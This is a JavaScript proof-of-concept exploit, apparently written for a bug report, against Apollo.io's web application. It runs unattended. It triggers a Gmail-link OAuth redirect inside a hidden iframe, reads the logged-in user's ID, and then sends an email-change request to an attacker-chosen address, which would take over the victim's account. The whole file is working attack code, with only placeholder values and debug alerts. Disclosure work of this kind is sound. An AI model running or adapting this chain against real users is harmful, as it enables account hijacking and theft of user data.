async function updateUser() {
  const url = "https://app.apollo.io/api/v1/users/current"; // replace with your endpoint

  const body = {
    notification_last_read_at: new Date().toISOString(),
    cacheKey: Date.now()
  };

  try {
    const res = await fetch(url, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json"
        // ⚠️ If your API requires auth, add it here (e.g. Authorization, X-CSRF-Token, etc.)
      },
      body: JSON.stringify(body)
    });

    if (!res.ok) {
      throw new Error(`Request failed: ${res.status}`);
    }

    const data = await res.json();

    // Extract the user ID
    const userId = data.user?.id;
    return userId

  } catch (err) {
    console.error("Error:", err);
  }
}


async function fetchRedirect() {
  try {
    // 1. Fetch Apollo link_gmail endpoint
    const step1 = await fetch("https://app.apollo.io/api/v1/email_accounts/link_gmail?mode=user_signin&redirect_to=https%3A%2F%2Fapp.apollo.io%2F%23%2Fonboarding-hub%2Fqueue&cacheKey=" + Date.now(), {
      cache: "no-store",
      credentials: "include"
    });

    const data1 = await step1.json();
    const redirectTo = data1?.redirect_to;
    alert(redirectTo)
    if (!redirectTo) {
      alert("❌ No redirect_to found.");
      return;
    }

    // 👉 Instead of fetching, inject iframe
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = redirectTo;
    document.body.appendChild(iframe);

  } catch (err) {
    alert("❌ Error: " + err.message);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function createUser() {
  fetchRedirect();
  await sleep(3000); // wait 2 seconds
  let id = await updateUser()
  const url = "https://app.apollo.io/api/v1/users/"+id+"/request_email_change";

  const body = {
    email: "POCCCCCCC@gmail.com",
    cacheKey: Date.now() // you had 1757772857134
  };

  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
        // Add only the headers you *really* need
      },
      body: JSON.stringify(body)
    });

    const data = await res.json();
    console.log("Response:", data);
  } catch (err) {
    console.error("Error:", err);
  }
}


createUser();
